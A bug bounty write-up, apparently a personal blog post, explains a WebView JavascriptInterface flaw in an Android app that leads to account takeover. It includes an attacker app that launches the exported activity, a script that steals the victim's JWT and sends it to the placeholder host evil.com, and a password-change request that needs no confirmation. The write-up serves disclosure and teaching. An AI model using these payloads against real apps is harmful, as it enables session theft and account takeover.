---
layout: post
title: WebView XSS, account takeover 
date: 2022-11-26 13:00 -0400
---

Some context: I have been hunting on this one private program for about 6 months. Some time ago i decided to learn how to test mobile apps.

Mobile apps are interesting because you can decompile the java bytecode and perform a very thorough code review on it.

It does have some limitations, sometimes the code can be obfuscated (or optimized?) which makes it harder to read it. But most of the time it works pretty well.

Even if the code is obfuscated you can clean up with tools like Enigma ty minecraft.

---

Actual analysis:
When testing on android apps. You usually want to look at exported activities.
While testing this app I found that one of the WebView activities were exported.
```xml
<activity android:exported="true" android:name=".WebViewDeepLinkHandlerActivity"/>
```
This activity called a WebViewFragment and WebViewFragment implemented a JavascriptInterface.
The code was something like this:
```java
static final void getToken(String str) {
    String accessToken = AccountManager.getAccessToken();
    String str2 = accessToken;
    if (accessToken == null) {
        str2 = "";
    }
    baseJavascriptAccessor.evaluateCallbackJs(getEnvCallbackData$default(baseJavascriptAccessor, str2, 0, 2, null), str, baseJavascriptAccessor.webView);
}
    
static final void evaluateCallbackJs(JsCallbackData jsCallbackData, String str, WebView webView) {
    String str2;
    if (str != null) {
        if (jsCallbackData != null) {
            Gson gson = new Gson();
            str2 = str + " (" + (!(gson instanceof Gson) ? gson.toJson(jsCallbackData) : GsonInstrumentation.toJson(gson, jsCallbackData)) + ')';
        } else {
            str2 = str + " ()";
        }
        if (webView != null) {
            WebviewExtKt.postEvaluateJavaScript(webView, str2);
        }
    }
}
```
What this code does is, it evals the string as javascript like:
attacker_controlled_string(JSON.stringify(jsCallback))
So if we can access this method we can call any JS funtion that we want.
You can access methods from a JavascriptInterface on the window object like window.Android.getToken("lalala") but for that we would need to control the url on which the WebView gets opened at. Thankfully for me this Activity allowed me to do just that.
So we can attack the app via or own app, the attacker app looks like:
```kotlin
  fun startExportedActivity(view: View){
        try {
            val intent = Intent()
            val uri = Uri.Builder()
            val url = uri
                .scheme("https")
                .authority("evil.com")
                .build()

            intent.setClassName("com.app", ".WebViewDeepLinkHandlerActivity")
            intent.data = url

            startActivity(intent)
        } catch (e: Exception) {
            println("ERROR: $e")
            val toast: Toast = Toast.makeText(this, "something went wrong, check logcat", Toast.LENGTH_SHORT)
            toast.show()
        }
    }
```
What this does is, it calls the exported activity, setting our controlled url (evil.com) on the intent. That will make the Activity open or url inside the WebView.
On evil.com we have the following code:
```javascript
<script>
 setTimeout(()=>{
   window.Android.getToken('function ext(jwt){fetch(`https://evil.com/?jwt=${JSON.stringify(jwt)}`, {mode:"no-cors"})};ext')
 }, 5000)
</script>
```
Giving us the JWT token of the victim.
Account takeover
 Previous on my testing I had found an endpoint that allowed an user to change its password without any kind of confirmation.
 The default request looked something like:
```http
PATCH /api/customers HTTP/2
Host: victim.com
Authorization: Bearer <JWT>

{
  "currentPassword": "password",
  "newPassword": "newpassword",
}
```
but it only cared for newPassword field so the following would work:
```http
PATCH /api/customers HTTP/2
Host: victim.com
Authorization: Bearer <JWT>

{
  "newPassword": "newpassword"
}
```
So we use the JWT token and get full control of the victim account.
Not the most exciting vulnerability but understanding how JavascriptInterface works was fun.
 
Awarded $2000 + $500 bonus severity considered as high, personally i think this was a critical, but i was content with the bonus.
Intent: Intent is how apps on Android communicate with each other.
Webview: Its an embeddable browser with limited features.

References: [Android-security-checklist-webview](https://blog.oversecured.com/Android-security-checklist-webview/)
